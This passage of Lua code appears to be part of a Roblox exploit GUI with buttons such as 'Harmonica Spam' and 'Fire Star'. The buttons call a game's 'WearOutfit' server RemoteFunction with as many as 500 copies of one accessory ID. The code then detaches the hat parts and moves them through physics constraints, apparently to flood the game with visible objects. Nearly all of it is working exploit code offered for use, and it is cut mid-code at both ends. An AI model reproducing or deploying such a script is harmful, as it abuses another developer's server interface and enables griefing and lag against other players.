YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat25()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "25"
print(fe.Name)
local HAT = "25"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -48

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat26()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "26"
print(fe.Name)
local HAT = "26"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -50

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat27()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "27"
print(fe.Name)
local HAT = "27"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -52

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat28()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "28"
print(fe.Name)
local HAT = "28"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -54

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat29()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "29"
print(fe.Name)
local HAT = "29"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -56

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

local function hat30()
local e = math.random(-10000000,10000000)
   print(e)
local fe = game.Players.LocalPlayer.Character:FindFirstChild("Pal Hair")
fe.Name = "30"
print(fe.Name)
local HAT = "30"
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = -2.5
Zval.Value = -1.5 -58

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

game['Run Service'].RenderStepped:Connect(function()

end)

for _, v in pairs(hum:GetAccessories()) do
    if v.Name == HAT then
	local b = v.Handle;
	b.Mesh:Destroy()
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
	align.Responsiveness = 20
	local a0 = Instance.new('Attachment', b);
	local a1 = Instance.new('Attachment', chr.Head);
	align.Attachment0 = a0;
	align.Attachment1 = a1;
	table.insert(mov, a1);
	table.insert(mov2, still);
	end
end

local mode = 1;
local l = 1;
game['Run Service'].RenderStepped:Connect(function()
    if alive == true then
	if mode == 1 then
		for _, v in pairs(mov) do
		   v.Position = Vector3.new(Xval.Value, Yval.Value, Zval.Value);
		end
	end
	end
end)


local function orie()
game['Run Service'].RenderStepped:Connect(function()
if chr.Humanoid.Health == 0 then
	toggle = false
end
for _, v in pairs(hum:GetAccessories()) do
if v.Name == HAT then
local b = v.Handle;
    b.Orientation = Vector3.new(plr.Character.Head.Orientation.X + XvalO.Value, plr.Character.Head.Orientation.Y + YvalO.Value, plr.Character.Head.Orientation.Z + ZvalO.Value)
end
end

end)
end

for _, v in pairs(mov2) do
	v.AngularVelocity = angular;
end

orie() 
end

habies:InvokeServer(args)
hat1()
hat2()
hat3()
hat4()
hat5()
hat6()
hat7()
hat8()
hat9()
hat10()
hat11()
hat12()
hat13()
hat14()
hat15()
hat16()
hat17()
hat18()
hat19()
hat20()
hat21()
hat22()
hat23()
hat24()
hat25()
hat26()
hat27()
hat28()
hat29()
hat30() 
end)

Script_3.Name = "HomebrewAdmin"
Script_3.Parent = HatScripts
Script_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_3.Position = UDim2.new(1.32692313, 0, 15, 0)
Script_3.Size = UDim2.new(0, 52, 0, 19)
Script_3.Visible = false
Script_3.Font = Enum.Font.SourceSans
Script_3.TextScaled = true
Script_3.Text = "Harmonica Spam"
Script_3.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_3.TextSize = 14.000
Script_3.MouseButton1Click:connect(function()
    local habies = game.ReplicatedStorage.RemoteFunctions.WearOutfit

local code = "24112667"
local args = {
    Face = "";
    
        Hat1 = code;
    Hat2 = code;
    Hat3 = code;
    Hat4 = code;
    Hat5 = code;
    Hat6 = code;
    Hat7 = code;
    Hat8 = code;
    Hat9 = code;
    Hat10 = code;
    Hat11 = code;
    Hat12 = code;
    Hat13 = code;
    Hat14 = code;
    Hat15 = code;
    Hat16 = code;
    Hat17 = code;
    Hat18 = code;
    Hat19 = code;
    Hat20 = code;
    Hat21 = code;
    Hat22 = code;
    Hat23 = code;
    Hat24 = code;
    Hat25 = code;
    Hat26 = code;
    Hat27 = code;
    Hat28 = code;
    Hat29 = code;
    Hat30 = code;
    Hat31 = code;
    Hat32 = code;
    Hat33 = code;
    Hat34 = code;
    Hat35 = code;
    Hat36 = code;
    Hat37 = code;
    Hat38 = code;
    Hat39 = code;
    Hat40 = code;
    Hat41 = code;
    Hat42 = code;
    Hat43 = code;
    Hat44 = code;
    Hat45 = code;
    Hat46 = code;
    Hat47 = code;
    Hat48 = code;
    Hat49 = code;
    Hat50 = code;
        Hat51 = code;
    Hat52 = code;
    Hat53 = code;
    Hat54 = code;
    Hat55 = code;
    Hat56 = code;
    Hat57 = code;
    Hat58 = code;
    Hat59 = code;
    Hat60 = code;
    Hat61 = code;
    Hat62 = code;
    Hat63 = code;
    Hat64 = code;
    Hat65 = code;
    Hat66 = code;
    Hat67 = code;
    Hat68 = code;
    Hat69 = code;
    Hat70 = code;
    Hat71 = code;
    Hat72 = code;
    Hat73 = code;
    Hat74 = code;
    Hat75 = code;
    Hat76 = code;
    Hat77 = code;
    Hat78 = code;
    Hat79 = code;
    Hat80 = code;
    Hat81 = code;
    Hat82 = code;
    Hat83 = code;
    Hat84 = code;
    Hat85 = code;
    Hat86 = code;
    Hat87 = code;
    Hat88 = code;
    Hat89 = code;
    Hat90 = code;
    Hat91 = code;
    Hat92 = code;
    Hat93 = code;
    Hat94 = code;
    Hat95 = code;
    Hat96 = code;
    Hat97 = code;
    Hat98 = code;
    Hat99 = code;
    Hat100 = code;
    
    Hat101 = code;
    Hat102 = code;
    Hat103 = code;
    Hat104 = code;
    Hat105 = code;
    Hat106 = code;
    Hat107 = code;
    Hat108 = code;
    Hat109 = code;
    Hat110 = code;
    Hat111 = code;
    Hat112 = code;
    Hat113 = code;
    Hat114 = code;
    Hat115 = code;
    Hat116 = code;
    Hat117 = code;
    Hat118 = code;
    Hat119 = code;
    Hat120 = code;
    Hat121 = code;
    Hat122 = code;
    Hat123 = code;
    Hat124 = code;
    Hat125 = code;
    Hat126 = code;
    Hat127 = code;
    Hat128 = code;
    Hat129 = code;
    Hat130 = code;
    Hat131 = code;
    Hat132 = code;
    Hat133 = code;
    Hat134 = code;
    Hat135 = code;
    Hat136 = code;
    Hat137 = code;
    Hat138 = code;
    Hat139 = code;
    Hat140 = code;
    Hat141 = code;
    Hat142 = code;
    Hat143 = code;
    Hat144 = code;
    Hat145 = code;
    Hat146 = code;
    Hat147 = code;
    Hat148 = code;
    Hat149 = code;
    Hat150 = code;
    Hat151 = code;
    Hat152 = code;
    Hat153 = code;
    Hat154 = code;
    Hat155 = code;
    Hat156 = code;
    Hat157 = code;
    Hat158 = code;
    Hat159 = code;
    Hat160 = code;
    Hat161 = code;
    Hat162 = code;
    Hat163 = code;
    Hat164 = code;
    Hat165 = code;
    Hat166 = code;
    Hat167 = code;
    Hat168 = code;
    Hat169 = code;
    Hat170 = code;
    Hat171 = code;
    Hat172 = code;
    Hat173 = code;
    Hat174 = code;
    Hat175 = code;
    Hat176 = code;
    Hat177 = code;
    Hat178 = code;
    Hat179 = code;
    Hat180 = code;
    Hat181 = code;
    Hat182 = code;
    Hat183 = code;
    Hat184 = code;
    Hat185 = code;
    Hat186 = code;
    Hat187 = code;
    Hat188 = code;
    Hat189 = code;
    Hat190 = code;
    Hat191 = code;
    Hat192 = code;
    Hat193 = code;
    Hat194 = code;
    Hat195 = code;
    Hat196 = code;
    Hat197 = code;
    Hat198 = code;
    Hat199 = code;
    Hat200 = code;
    Hat201 = code;
    Hat202 = code;
    Hat203 = code;
    Hat204 = code;
    Hat205 = code;
    Hat206 = code;
    Hat207 = code;
    Hat208 = code;
    Hat209 = code;
    Hat210 = code;
    Hat211 = code;
    Hat212 = code;
    Hat213 = code;
    Hat214 = code;
    Hat215 = code;
    Hat216 = code;
    Hat217 = code;
    Hat218 = code;
    Hat219 = code;
    Hat220 = code;
    Hat221 = code;
    Hat222 = code;
    Hat223 = code;
    Hat224 = code;
    Hat225 = code;
    Hat226 = code;
    Hat227 = code;
    Hat228 = code;
    Hat229 = code;
    Hat230 = code;
    Hat231 = code;
    Hat232 = code;
    Hat233 = code;
    Hat234 = code;
    Hat235 = code;
    Hat236 = code;
    Hat237 = code;
    Hat238 = code;
    Hat239 = code;
    Hat240 = code;
    Hat241 = code;
    Hat242 = code;
    Hat243 = code;
    Hat244 = code;
    Hat245 = code;
    Hat246 = code;
    Hat247 = code;
    Hat248 = code;
    Hat249 = code;
    Hat250 = code;
    Hat251 = code;
    Hat252 = code;
    Hat253 = code;
    Hat254 = code;
    Hat255 = code;
    Hat256 = code;
    Hat257 = code;
    Hat258 = code;
    Hat259 = code;
    Hat260 = code;
    Hat261 = code;
    Hat262 = code;
    Hat263 = code;
    Hat264 = code;
    Hat265 = code;
    Hat266 = code;
    Hat267 = code;
    Hat268 = code;
    Hat269 = code;
    Hat270 = code;
    Hat271 = code;
    Hat272 = code;
    Hat273 = code;
    Hat274 = code;
    Hat275 = code;
    Hat276 = code;
    Hat277 = code;
    Hat278 = code;
    Hat279 = code;
    Hat280 = code;
    Hat281 = code;
    Hat282 = code;
    Hat283 = code;
    Hat284 = code;
    Hat285 = code;
    Hat286 = code;
    Hat287 = code;
    Hat288 = code;
    Hat289 = code;
    Hat290 = code;
    Hat291 = code;
    Hat292 = code;
    Hat293 = code;
    Hat294 = code;
    Hat295 = code;
    Hat296 = code;
    Hat297 = code;
    Hat298 = code;
    Hat299 = code;
    Hat300 = code;
    Hat301 = code;
    Hat302 = code;
    Hat303 = code;
    Hat304 = code;
    Hat305 = code;
    Hat306 = code;
    Hat307 = code;
    Hat308 = code;
    Hat309 = code;
    Hat310 = code;
    Hat311 = code;
    Hat312 = code;
    Hat313 = code;
    Hat314 = code;
    Hat315 = code;
    Hat316 = code;
    Hat317 = code;
    Hat318 = code;
    Hat319 = code;
    Hat320 = code;
    Hat321 = code;
    Hat322 = code;
    Hat323 = code;
    Hat324 = code;
    Hat325 = code;
    Hat326 = code;
    Hat327 = code;
    Hat328 = code;
    Hat329 = code;
    Hat330 = code;
    Hat331 = code;
    Hat332 = code;
    Hat333 = code;
    Hat334 = code;
    Hat335 = code;
    Hat336 = code;
    Hat337 = code;
    Hat338 = code;
    Hat339 = code;
    Hat340 = code;
    Hat341 = code;
    Hat342 = code;
    Hat343 = code;
    Hat344 = code;
    Hat345 = code;
    Hat346 = code;
    Hat347 = code;
    Hat348 = code;
    Hat349 = code;
    Hat350 = code;
    Hat351 = code;
    Hat352 = code;
    Hat353 = code;
    Hat354 = code;
    Hat355 = code;
    Hat356 = code;
    Hat357 = code;
    Hat358 = code;
    Hat359 = code;
    Hat360 = code;
    Hat361 = code;
    Hat362 = code;
    Hat363 = code;
    Hat364 = code;
    Hat365 = code;
    Hat366 = code;
    Hat367 = code;
    Hat368 = code;
    Hat369 = code;
    Hat370 = code;
    Hat371 = code;
    Hat372 = code;
    Hat373 = code;
    Hat374 = code;
    Hat375 = code;
    Hat376 = code;
    Hat377 = code;
    Hat378 = code;
    Hat379 = code;
    Hat380 = code;
    Hat381 = code;
    Hat382 = code;
    Hat383 = code;
    Hat384 = code;
    Hat385 = code;
    Hat386 = code;
    Hat387 = code;
    Hat388 = code;
    Hat389 = code;
    Hat390 = code;
    Hat391 = code;
    Hat392 = code;
    Hat393 = code;
    Hat394 = code;
    Hat395 = code;
    Hat396 = code;
    Hat397 = code;
    Hat398 = code;
    Hat399 = code;
    Hat400 = code;
    Hat401 = code;
    Hat402 = code;
    Hat403 = code;
    Hat404 = code;
    Hat405 = code;
    Hat406 = code;
    Hat407 = code;
    Hat408 = code;
    Hat409 = code;
    Hat410 = code;
    Hat411 = code;
    Hat412 = code;
    Hat413 = code;
    Hat414 = code;
    Hat415 = code;
    Hat416 = code;
    Hat417 = code;
    Hat418 = code;
    Hat419 = code;
    Hat420 = code;
    Hat421 = code;
    Hat422 = code;
    Hat423 = code;
    Hat424 = code;
    Hat425 = code;
    Hat426 = code;
    Hat427 = code;
    Hat428 = code;
    Hat429 = code;
    Hat430 = code;
    Hat431 = code;
    Hat432 = code;
    Hat433 = code;
    Hat434 = code;
    Hat435 = code;
    Hat436 = code;
    Hat437 = code;
    Hat438 = code;
    Hat439 = code;
    Hat440 = code;
    Hat441 = code;
    Hat442 = code;
    Hat443 = code;
    Hat444 = code;
    Hat445 = code;
    Hat446 = code;
    Hat447 = code;
    Hat448 = code;
    Hat449 = code;
    Hat450 = code;
    Hat451 = code;
    Hat452 = code;
    Hat453 = code;
    Hat454 = code;
    Hat455 = code;
    Hat456 = code;
    Hat457 = code;
    Hat458 = code;
    Hat459 = code;
    Hat460 = code;
    Hat461 = code;
    Hat462 = code;
    Hat463 = code;
    Hat464 = code;
    Hat465 = code;
    Hat466 = code;
    Hat467 = code;
    Hat468 = code;
    Hat469 = code;
    Hat470 = code;
    Hat471 = code;
    Hat472 = code;
    Hat473 = code;
    Hat474 = code;
    Hat475 = code;
    Hat476 = code;
    Hat477 = code;
    Hat478 = code;
    Hat479 = code;
    Hat480 = code;
    Hat481 = code;
    Hat482 = code;
    Hat483 = code;
    Hat484 = code;
    Hat485 = code;
    Hat486 = code;
    Hat487 = code;
    Hat488 = code;
    Hat489 = code;
    Hat490 = code;
    Hat491 = code;
    Hat492 = code;
    Hat493 = code;
    Hat494 = code;
    Hat495 = code;
    Hat496 = code;
    Hat497 = code;
    Hat498 = code;
    Hat499 = code;
    Hat500 = code;
    
    RemoveShirt = false;
    
    Pants = "";
    RPDesc = "";
    RPName = "";
    Shirt = "";
}

habies:InvokeServer(args)

local hum = game.Players.LocalPlayer.Character.Humanoid
--[[
for i,hat in pairs(hum:GetAccessories()) do
    b = hat.Handle
    b.Mesh:Destroy()
end
]]


end)
Script_4.Name = "Script"
Script_4.Parent = HatScripts
Script_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Script_4.Position = UDim2.new(0, 0, 15, 0)
Script_4.Size = UDim2.new(0, 52, 0, 19)
Script_4.Visible = false
Script_4.Font = Enum.Font.SourceSans
Script_4.Text = "Fire Star"
Script_4.TextColor3 = Color3.fromRGB(0, 0, 0)
Script_4.TextSize = 14.000

selecte = Instance.new("NumberValue")
selecte.Value = 1
colorSelect.Name = "Color"
colorSelect.Parent = HatScripts
colorSelect.BackgroundColor3 = Color3.fromRGB(255,165,0)
colorSelect.Position = UDim2.new(.38, 0, 16.5, 0)
colorSelect.Size = UDim2.new(0, 10, 0, 10)
colorSelect.Visible = false
colorSelect.Font = Enum.Font.SourceSans
colorSelect.Text = ""
colorSelect.TextColor3 = Color3.fromRGB(0, 0, 0)
colorSelect.TextSize = 14.000
colorSelect.MouseButton1Click:connect(function()
    selecte.Value = selecte.Value +1
    if selecte.Value == 1 then
       colorSelect.BackgroundColor3 = Color3.fromRGB(255,165,0) 
    end
    if selecte.Value == 2 then
       colorSelect.BackgroundColor3 = Color3.fromRGB(0,0,255) 
    end
    if selecte.Value == 3 then
       colorSelect.BackgroundColor3 = Color3.fromRGB(0,255,0) 
    end
    if selecte.Value >= 4 then
        colorSelect.BackgroundColor3 = Color3.fromRGB(255,165,0)
       selecte.Value = 1 
    end
end)

Script_4.MouseButton1Click:connect(function()
   local habies = game.ReplicatedStorage.RemoteFunctions.WearOutfit
  local c = {}
op1 = "215718515";
op2 = "74891470";
op3 = "1744060292";
if selecte.Value == 1 then
   code = op1
end
if selecte.Value == 2 then
   code = op2
end
if selecte.Value == 3 then
   code = op3
end
local args = {
    Face = "";
    
    Hat1 = code;
    Hat2 = code;
    Hat3 = code;
    Hat4 = code;
    Hat5 = code;
    Hat6 = code;
    Hat7 = code;
    Hat8 = code;
    Hat9 = code;
    Hat10 = code;
    Hat11 = code;
    Hat12 = code;
    Hat13 = code;
    Hat14 = code;
    Hat15 = code;
    Hat16 = code;
    Hat17 = code;
    Hat18 = code;
    Hat19 = code;
    Hat20 = code;
    Hat21 = code;
    Hat22 = code;
    Hat23 = code;
    Hat24 = code;
    Hat25 = code;
    
    RemoveShirt = false;
    
    Pants = "";
    RPDesc = "";
    RPName = "";
    Shirt = "";
}

habies:InvokeServer(args)

--[[
for i,hat in pairs(hum:GetAccessories()) do
    b = hat.Handle
    b.Mesh:Destroy()
end
]]
local part = Instance.new("Part", workspace)
local Xval = Instance.new("NumberValue")
local Yval = Instance.new("NumberValue")
local Zval = Instance.new("NumberValue")

local XvalO = Instance.new("NumberValue")
local YvalO = Instance.new("NumberValue")
local ZvalO = Instance.new("NumberValue")

local num3 = Instance.new("NumberValue")
local ori = Instance.new("NumberValue")
local an = Instance.new("NumberValue")
local toggle = true

local angular = Vector3.new(0,0,0)
ori.Value = 100
num3.Value = 0

Xval.Value = 0
Yval.Value = 0
Zval.Value = 0

XvalO.Value = 0
YvalO.Value = 0
ZvalO.Value = 0

local plr = game.Players.LocalPlayer;
local chr = plr.Character;
local hum = chr.Humanoid;
local mov = {};
local mov2 = {};

for _, v in pairs(hum:GetAccessories()) do
	local b = v.Handle;
	b.CanCollide = false;
	b:BreakJoints();
	for _, k in pairs(v:GetChildren()) do
		if not k:IsA'SpecialMesh' and not k:IsA'Part' then
			k:Destroy();
		end
	end
	local still = Instance.new('BodyAngularVelocity', b);
	local align = Instance.new('AlignPosition', b);
	align.RigidityEnabled = false;
